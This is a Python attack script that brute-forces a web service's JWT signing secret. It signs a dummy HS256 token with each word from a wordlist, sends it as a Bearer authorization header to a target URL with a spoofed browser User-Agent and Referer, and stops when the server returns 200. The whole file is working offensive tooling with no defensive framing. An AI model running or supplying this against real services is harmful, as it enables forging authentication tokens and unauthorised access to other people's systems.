#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import jwt
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str, required=True)
parser.add_argument('-r', '--referer', type=str, required=True)
parser.add_argument('-w', '--wordlist', type=list, required=True)
args = parser.parse_args()

wl = open(args.wordlist)
wl = wl.read().split('\n')
user_agents = open('user_agents.txt')
user_agents = user_agents.read().split('\n')

for secret in wl:

    encoded = jwt.encode({"bla" : "blabla"}, '{s}'.format(s=secret), algorithm='HS256')
    req = str(encoded)
    tkn = "Bearer {t}".format(t=req[2:-1])

    burp0_url = args.url
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "", "authorization": ""}
    burp0_headers['authorization'] = tkn
    burp0_headers['Referer'] = args.referer

    r = requests.post(burp0_url, headers=burp0_headers)
    print('{s} > {r}'.format(s=secret,r=r.status_code))
    if r.status_code == 200:
        print('\nSECRET FOUND')
        print('')
        print('Token JWT: {t}'.format(t=tkn))
        exit(0)

print('Secret NOT FOUND!')
